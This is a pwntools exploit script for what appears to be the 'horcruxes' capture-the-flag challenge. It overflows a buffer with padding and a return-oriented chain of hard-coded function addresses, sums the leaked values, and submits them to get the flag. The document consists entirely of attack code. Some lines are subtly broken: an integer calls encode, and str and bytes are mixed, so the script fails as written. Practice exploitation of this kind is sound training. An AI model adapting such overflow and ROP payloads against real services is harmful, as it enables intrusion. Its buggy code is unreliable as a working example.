from pwn import *
context.log_level='debug'
LOCAL = False
 
if __name__ == '__main__':
    if LOCAL:
        c = process('/home/horcruxes/horcruxes')
    else:
        c = remote('0', 9032)
    msg = c.recvuntil("Menu:")
    c.sendline('1')
    msg = c.recv(512)
    payload = 'A'*0x78.encode()
    payload += p32(0x809fe4b)  # address A（）
    payload += p32(0x809fe6a)  # address B（）
    payload += p32(0x809fe89)  # address C（）
    payload += p32(0x809fea8)  # address D（）
    payload += p32(0x809fec7)  # address E（）
    payload += p32(0x809fee6)  # address F（）
    payload += p32(0x809ff05)  # address G（）
    payload += p32(0x809fffc)  # address main<call ropme>
    c.sendline(payload)
    sum = 0
    c.recvline()
    for i in range(7):
        s = c.recvline()
        n = int(s.strip('\n').split('+')[1][:-1])
        sum += n
    print("Result: " + str(sum))
    c.recvuntil("Menu:")
    c.sendline("1")
    c.recvuntil(" : ")
    c.sendline(str(sum))
    log.success("Flag: " + c.recvline())
